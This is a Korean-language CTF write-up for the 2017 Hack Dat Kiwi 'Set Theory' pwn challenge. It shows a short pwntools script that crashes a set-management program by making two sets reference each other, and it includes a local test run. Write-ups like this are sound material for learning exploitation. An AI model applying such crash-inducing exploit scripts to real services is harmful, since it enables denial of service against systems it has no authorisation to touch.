# [2017_Hack_Dat_Kiwi] \[PWN] Set Theory

## Analysis

이 문제도 Chessmaster 문제와 비슷하게 크래시가 발생하면 플래그가 출력됩니다.

```
Type help for help:
> help
set1 = |"data", set2|	Create a set
set1 = set2+set3	union
set1 = set2^set3	intersection
set1 = set2-set3	difference
set1 = set2~set3	symmetric difference
set1 @@ set2		subset. Result is T or F
help		Help menu
exit		Exit
print		Prints all sets and their elements
prints <set1>	Print an expanded set
> 
```

프로그램은 집합을 관리하는 프로그램입니다.

```
Type help for help:
> set1=|"aaa"|
> set2=|"bbb"|
> print 
@s = |"@s"|
@s = |"@s"|
> prints set1
set1 = |"aaa"|
> prints set2
set2 = |"bbb"|
> 
```

위와 같이 집합을 만들고 변경하고 출력해볼 수 있습니다.

어떻게 해야 크래시를 발생시킬 수 있을지 고민했습니다. 분석해보니 집합이 포인터에 의해 관리되는데 이 포인터가 서로가 서로를 참조하게 하면 크래시가 발생할 듯 싶었습니다.

## Exploit

```python
from pwn import *

p = remote("0", 2004)
print p.recv()
payload = "aaa=||"
p.sendline(payload)

print p.recv()
payload = "bbb=||"
p.sendline(payload)

print p.recv()
payload = "aaa=|bbb|"
p.sendline(payload)

print p.recv()
payload = "bbb=|aaa|"
p.sendline(payload)
p.interactive()
```

## Result

```
# python ex.py 
[+] Opening connection to 0 on port 2004: Done
Type help for help:
> 
> 
> 
> 
[*] Switching to interactive mode
> $ prints aaa
Flag is: Could not open file
```

